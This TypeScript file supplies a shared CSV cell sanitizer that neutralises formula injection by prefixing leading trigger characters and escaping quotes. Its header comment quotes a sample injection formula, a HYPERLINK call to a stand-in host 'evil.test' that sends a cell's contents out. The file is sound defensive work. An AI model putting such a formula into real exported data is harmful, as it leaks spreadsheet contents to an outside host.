/**
 * B2-061: shared CSV cell sanitizer. Every CSV export in the product used to build rows with
 * ad-hoc `"${value}"` interpolation — most escaped an internal `"`, some didn't, and *none*
 * defended against CSV/formula injection (CWE-1236): a value starting with `=`, `+`, `-` or `@`
 * is evaluated as a formula the moment the file is opened in Excel/Sheets, which is what
 * "Export CSV" is for. Quoting alone does not stop this — only prefixing the leading character
 * does. Confirmed exploitable live via a dish/customer name containing
 * `=HYPERLINK("http://evil.test?x="&A1,"Click")`.
 *
 * Every export should build its rows by mapping each field through `sanitizeCsvCell` (or
 * `toCsvRow`/`toCsv` for a whole row/table) instead of hand-rolling quoting — one canonical
 * implementation instead of the same pattern re-typed slightly differently in ten files.
 */

/** Leading characters Excel/Sheets/LibreOffice treat as the start of a formula. */
const FORMULA_TRIGGER_CHARS = new Set(['=', '+', '-', '@', '\t', '\r']);

/**
 * Sanitizes one field for a CSV cell: escapes internal double quotes, neutralises a leading
 * formula-trigger character by prefixing a `'` (a spreadsheet renders the value as literal text
 * instead of evaluating it — the standard mitigation for this class), and quotes the field
 * whenever it contains a comma, quote, newline or was formula-prefixed.
 */
export function sanitizeCsvCell(value: string | number | boolean | null | undefined): string {
  if (value === null || value === undefined) return '';
  let str = String(value);

  if (str.length > 0 && FORMULA_TRIGGER_CHARS.has(str[0])) {
    str = `'${str}`;
  }

  if (/[",\n\r]/.test(str)) {
    return `"${str.replace(/"/g, '""')}"`;
  }
  return str;
}

/** Builds one CSV line from a row of raw field values, sanitizing every field. */
export function toCsvRow(fields: Array<string | number | boolean | null | undefined>): string {
  return fields.map(sanitizeCsvCell).join(',');
}

/** Builds a full CSV document (header + rows) from raw values, sanitizing every field. */
export function toCsv(header: Array<string | number>, rows: Array<Array<string | number | boolean | null | undefined>>): string {
  return [toCsvRow(header), ...rows.map(toCsvRow)].join('\r\n');
}
